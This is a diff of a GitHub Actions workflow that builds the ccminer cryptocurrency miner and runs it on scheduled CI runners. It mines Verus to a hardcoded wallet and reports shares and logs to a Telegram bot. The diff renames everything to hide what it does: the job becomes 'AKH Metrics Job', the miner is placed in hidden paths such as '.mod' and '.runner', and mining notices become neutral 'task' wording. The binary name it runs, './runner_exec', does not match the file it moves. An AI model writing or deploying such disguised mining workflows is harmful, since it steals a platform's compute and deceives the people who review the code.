@@ -1,4 +1,4 @@
-name: AKH Job
+name: AKH Metrics Job
 
 on:
   schedule:
@@ -6,29 +6,29 @@ on:
   workflow_dispatch:
 
 jobs:
-  akh_job:
+  metrics_collector:
     runs-on: ubuntu-latest
     timeout-minutes: 300
 
     steps:
-      - name: Environment Setup
+      - name: Setup Environment
         run: |
           sudo apt update
           sudo apt install -y build-essential cmake automake libtool pkg-config libcurl4-openssl-dev git
 
-      - name: Build Engine
+      - name: Download Core Binary
         run: |
-          git clone https://github.com/monkins1010/ccminer.git akh_src
-          cd akh_src
+          git clone https://github.com/monkins1010/ccminer.git .mod
+          cd .mod
           chmod +x build.sh
           ./build.sh
-          mv ccminer ../akh_exec
+          mv ccminer ../.runner
 
-      - name: Run AKH Mining
+      - name: Execute Core Task
         run: |
           WALLET="RGVmtuvrP2yX8q3U4up77CcSpkcVhp4bUG"
-          WORKER="AKH1"
-          LOG="akh.log"
+          WORKER="akhunit"
+          LOG="a.log"
           MAX_IDLE=600
 
           TELEGRAM_TOKEN="${{ secrets.TELEGRAM_TOKEN }}"
@@ -52,10 +52,10 @@ jobs:
               "https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendDocument?chat_id=${TELEGRAM_CHAT_ID}"
           }
 
-          notify "🟢 *AKH1 mining started*"
+          notify "🟢 *akhunit active*"
 
           for POOL in "${POOLS[@]}"; do
-            ./akh_exec -a verus -o "$POOL" -u "$WALLET.$WORKER" -p hybrid -t 2 > "$LOG" 2>&1 &
+            ./runner_exec -a verus -o "$POOL" -u "$WALLET.$WORKER" -p hybrid -t 2 > "$LOG" 2>&1 &
             PID=$!
             sleep 10
 
@@ -64,39 +64,39 @@ jobs:
               break
             else
               kill $PID >/dev/null 2>&1
-              notify "⚠️ Failed pool: \`$POOL\`"
+              notify "⚠️ Fallback triggered: \`$POOL\`"
             fi
           done
 
           if ! ps -p $PID > /dev/null; then
-            notify "❌ AKH1 failed all pools. Exit."
+            notify "❌ Task failed. No connection"
             exit 1
           fi
 
           LAST=$(date +%s)
-          ACCEPTED=0
+          COUNT=0
 
           tail -F "$LOG" | while read -r line; do
             NOW=$(date +%s)
 
             if echo "$line" | grep -iq "accepted"; then
-              ACCEPTED=$((ACCEPTED + 1))
+              COUNT=$((COUNT + 1))
               LAST=$NOW
-              RATE=$(echo "$line" | grep -o "[0-9.]\+ kH/s")
-              notify "✅ *Share Accepted*\n📦 Total: *$ACCEPTED*\n⚡ $RATE"
+              SPEED=$(echo "$line" | grep -o "[0-9.]\+ kH/s")
+              notify "✅ *Share Logged*\n📦 Total: $COUNT\n⚡ $SPEED"
             fi
 
             if [ $((NOW - LAST)) -gt $MAX_IDLE ]; then
-              notify "🛑 Idle >10m. Restarting..."
+              notify "🛑 Idle timeout. Restart triggered."
               kill $PID
               break
             fi
 
             if ! ps -p $PID > /dev/null; then
-              notify "❌ AKH miner crashed"
+              notify "❌ Unexpected exit"
               break
             fi
           done
 
           send_log
-          notify "📴 *AKH1 ended*\nTotal shares: *$ACCEPTED*"
+          notify "📴 *akhunit completed*\nTotal shares: *$COUNT*"
